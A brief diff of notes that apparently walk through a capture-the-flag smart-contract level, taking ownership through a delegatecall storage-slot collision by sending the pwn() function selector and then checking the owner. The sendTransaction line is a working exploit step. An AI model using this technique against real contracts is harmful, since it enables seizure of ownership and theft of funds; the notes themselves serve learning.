@@ -3,3 +3,4 @@
 3. so if owner in Delegate occupies slot 0, we make msg.sender be saved in 0
 4. await sendTransaction({from:player, to:instance, data: web3.sha3("pwn()").slice(0,10)})
 5. This calls the function name and argument data types, first 4 bytes
+5. await contract.owner() to confirm
